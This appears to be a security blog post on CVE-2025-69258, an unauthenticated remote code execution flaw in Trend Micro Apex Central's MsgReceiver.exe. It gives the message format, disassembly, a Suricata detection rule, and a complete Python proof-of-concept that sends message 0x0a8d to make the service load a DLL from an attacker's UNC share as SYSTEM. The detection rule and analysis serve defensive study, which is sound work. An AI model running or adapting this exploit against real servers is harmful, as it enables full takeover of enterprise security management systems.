---
layout: post
title: Suricata CVE-2025-69258 MsgReceiver.exe LoadLibraryEx RCE(CVSS 9.8)
subtitle: There's lots to learn!
tags: [CyberSec]
comments: true
---

## Synopsis


MsgReceiver.exe listens on default TCP port 20001 and accepts messages having the following structures:
```c
// be = big endian
// le = little endian
struct hdr
{
   be32 MsgSize; // for entire message
   byte unk[9];
};

 

struct body
{
   le16 MsgId; // 0x08ff - SC_QUERY_PROCESS_ID_REQUEST
               // 0x0900 - SC_QUERY_PROCESS_ID_REPLY
               // 0x08fd - SC_UNLOAD_REQUEST
               // 0x08fe - SC_UNLOAD_REPLY
               // 0x0a8d - SC_INSTALL_HANDLER_REQUEST
               // 0x0a8e - SC_INSTALL_HANDLER_REPLY
               // 0x0901 - SC_UPDATE_DEBUG_MODE_REQUEST
               // 0x0a8f - FwdMsg2LogInterceptors
               // 0x1b5b - SC_CMD_CGI_LOG_REQUEST
               // [...]
   byte data[hdr.MsgSize-15]; // message-specific data
};


struct msg
{
   hdr h;
   body b;
};


struct x_astring
{
   le32 size;        // string size
   byte data[size];  // string data, null-terminated
};

struct msg_0a8d
{
   hdr h;  
   le16 MsgId;         // must be 0x0a8d
   x_astring handler;  // interceptor handler DLL name
   le32 flag;          // 1 - install handler, 0 - uninstall handler
};

Message 0x0a8d includes the name of a DLL to be loaded via LoadLibraryEx():

// msgHandlerLogReceiver.dll, file version 8.0.0.7052
[...]
.text:10086012  push    LOAD_WITH_ALTERED_SEARCH_PATH
.text:10086014  push    0
.text:10086016  push    edi             ; VULN: attacker-controlled DLL
.text:10086016                          ; e.g., \\<attacker-host>\share\evil.dll
.text:10086017  call    ds:LoadLibraryExA
[...]
```
An unauthenticated remote attacker can send message 0x0a8d to load an attacker-controlled DLL into MsgReceiver.exe, leading to execution of attacker-supplied code under the security context of SYSTEM.

## Suricata Rule


```md
alert tcp any any -> any 20001 (
    msg:"POTENTIAL RCE MsgReceiver LoadLibraryEx (MsgId 0x0a8d) - Apex Central";
    flow:established,to_server;
    content:"|8d 0a|"; offset:13; depth:2;
    content:"|5c 5c|"; nocase;
    content:".dll"; nocase;
    classtype:attempted-admin;
    reference:cve,CVE-2025-69258;
    metadata: vendor TrendMicro;
    sid:9000010;
    rev:1;
)
```

## PoC (TODO)


```python
import socket,struct

ip_t = 'X.X.X.X'                # Vulnerable Apex Central server
port_t = 20001                  # Default MsgReceiver.exe port

# DLL path using UNC format ( \\\\192.168.1.50\\share\\seeyou.dll )
dll_p = b'\\\\\\\\X.X.X.X\\\\share\\\\seeyou.dll\x00'

# 13 bytes (header: 4-byte MsgSize + 9 unknown bytes)
# + 2 bytes (MsgId: 0x0a8d)
# + 4 bytes (string length field)
# + len(dll_p) bytes (actual DLL path with null terminator)
# + 4 bytes (flag field)
sizet = 13 + 2 + 4 + len(dll_p) + 4

# b'\x00'*9 = 9 padding bytes
header = struct.pack('>I', sizet) + b'\x00'*9
#struct hdr
#{
#   be32 MsgSize;
#   byte unk[9];
#};

# Message body for 0x0a8d (SC_INSTALL_HANDLER_REQUEST):
msg_id = struct.pack('<H', 0x0a8d)      
str_size = struct.pack('<I', len(dll_p)) 
flag = struct.pack('<I', 1)  # Flag=1 (install), 0=uninstall

message = header + msg_id + str_size + dll_p + flag

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(15)
try:
    sock.connect((ip_t, port_t))
    sock.send(message)
    print(f'[+] Connected to {ip_t}:{port_t}')
    try:
        response = sock.recv(1024)
        print(f'[+] Response received: {len(response)} bytes')
        if len(response) >= 15:  # At least header (13) + start of body
            resp_msg_id = struct.unpack('<H', response[13:15])[0]
            print(f'[+] Response Message ID: 0x{resp_msg_id:04x}')
            if resp_msg_id == 0x0a8e:
                print('SC_INSTALL_HANDLER_REPLY confirmed')
    except socket.timeout:
        print('[*] No response received (timeout)')
except Exception as e:
    print(f'[-] Error: {e}')
finally:
    sock.close()

print(f'[+] Payload sent successfully')
print(f'[+] DLL to load: {dll_p.decode()}')
```md
